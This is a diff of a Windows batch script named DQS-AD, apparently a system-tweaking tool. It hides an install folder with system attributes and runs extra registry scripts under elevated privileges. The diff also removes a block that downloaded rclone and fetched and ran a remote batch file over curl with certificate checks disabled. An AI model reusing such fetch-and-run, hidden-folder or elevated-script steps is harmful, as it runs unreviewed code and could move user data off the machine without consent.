@@ -2,7 +2,7 @@
 @echo off
 @Title DQS-AD
 cd /d %~dp0
-SET veropt=2.0
+SET veropt=2.1
 md %SystemDrive%\Ect
 set indigo=[38;5;105m
 set red=[91m
@@ -57,6 +57,7 @@ SET HHWID=LOAD
 SET HWID=LOAD
 SET GPU=ERR
 SET VLWD=N
+attrib +h +s "C:\Ect"
 
 rmdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
 mkdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
@@ -248,6 +249,13 @@ IF EXIST bin\SVPP6.STR (
 	Powercfg /import %systemdrive%\Ect\Alimentation\RECS-H-PowerPlan.pow 11111111-1111-1111-1111-111111134587
 	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP6" /t REG_SZ /d "Y" /f >nul
 	Powercfg /SETACTIVE "11111111-1111-1111-1111-111111134587"
+	cd /d %~dp0
+	PowerRun_x64.exe "bin\REGSCRIPT\NTLITE.bat">nul
+	timeout /t 03 /nobreak>nul
+	cd /d %~dp0
+	call bin\REGSCRIPT\NTLITE.bat
+	timeout /t 03 /nobreak>nul
+	cd /d %~dp0
 	echo Y>bin\SVPP6.END
 	DEL bin\SVPP6.STR
 )
@@ -451,10 +459,19 @@ IF EXIST bin\SVPP23.STR (
 )
 
 IF EXIST bin\SVPP24.STR (
+	cd /d %~dp0
 	PowerRun_x64.exe "bin\REGSCRIPT\REGSCRIPT5.bat">nul
 	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP24" /t REG_SZ /d "Y" /f >nul
-	timeout /t 02 /nobreak>nul
+	timeout /t 03 /nobreak>nul
+	cd /d %~dp0
+	PowerRun_x64.exe "bin\REGSCRIPT\REGSCRIPT6.bat">nul
+	timeout /t 03 /nobreak>nul
+	cd /d %~dp0
 	call bin\REGSCRIPT\REGSCRIPT5.bat
+	timeout /t 03 /nobreak>nul
+	cd /d %~dp0
+	call bin\REGSCRIPT\REGSCRIPT6.bat
+	timeout /t 03 /nobreak>nul
 	cd /d %~dp0
 	echo Y>bin\SVPP24.END
 	DEL bin\SVPP24.STR
@@ -702,32 +719,6 @@ IF EXIST HWID.txt (
 		for /f "usebackq tokens=*" %%a in ("HWID.txt") do (
     	set "HHWID=%%a"
 	)
-)
-
-IF %HWCN%==1 (
-    IF NOT EXIST rclone.exe (
-        echo [%TIME%] Installation rclone
-        curl -g -k -L -# -o "rclone-current-windows-amd64.zip" "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
-        tar -xvf rclone-current-windows-amd64.zip
-        setlocal enabledelayedexpansion
-        set "dossier_dezippe="
-        for /d %%i in (*) do (
-            if exist "%%i\rclone.exe" (
-                set "dossier_dezippe=%%i"
-                goto CopierRclone
-            )
-        )
-        :CopierRclone
-        copy "%dossier_dezippe%\rclone.exe"
-        @timeout /t 02>nul
-        rmdir /s /q "!dossier_dezippe!"
-        del /q "rclone-current-windows-amd64.zip"
-        endlocal
-    )
-    IF NOT EXIST sec-ath.bat curl -g -k -L -# -o "sec-ath.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/REPTILITE/sec-ath.bat"
-    @timeout /t 01 >nul
-    IF NOT EXIST rclone.conf call "sec-ath.bat" /1052
-    @timeout /t 01 >nul
 )
 
 cd /d %~dp0
